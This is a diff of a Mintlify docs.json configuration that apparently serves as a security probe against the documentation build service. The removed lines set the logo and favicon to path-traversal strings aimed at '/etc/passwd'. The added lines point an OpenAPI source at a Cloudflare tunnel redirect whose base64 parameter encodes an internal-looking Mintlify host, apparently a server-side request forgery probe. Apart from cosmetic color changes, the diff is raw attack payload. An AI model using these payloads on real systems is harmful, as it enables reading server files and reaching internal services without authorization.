@@ -1,9 +1,11 @@
 {
  "$schema": "https://mintlify.com/docs.json",
- "name": "Probe797",
+ "name": "mprobe782",
  "theme": "mint",
  "colors": {
-  "primary": "#000000"
+  "primary": "#FF0000",
+  "light": "#FFFFFF",
+  "dark": "#111111"
  },
  "navigation": {
   "groups": [
@@ -12,12 +14,13 @@
     "pages": [
      "index"
     ]
+   },
+   {
+    "group": "Probe848",
+    "openapi": [
+     "https://surrey-latitude-eat-blog.trycloudflare.com/rd/x/5802j6?u=aHR0cHM6Ly9rZXlyaW5nLWRldi5taW50bGlmeS5jb20v"
+    ]
    }
   ]
- },
- "logo": {
-  "light": "../../../../etc/passwd",
-  "dark": "../../../../../../etc/passwd"
- },
- "favicon": "../../../../etc/passwd"
+ }
 }
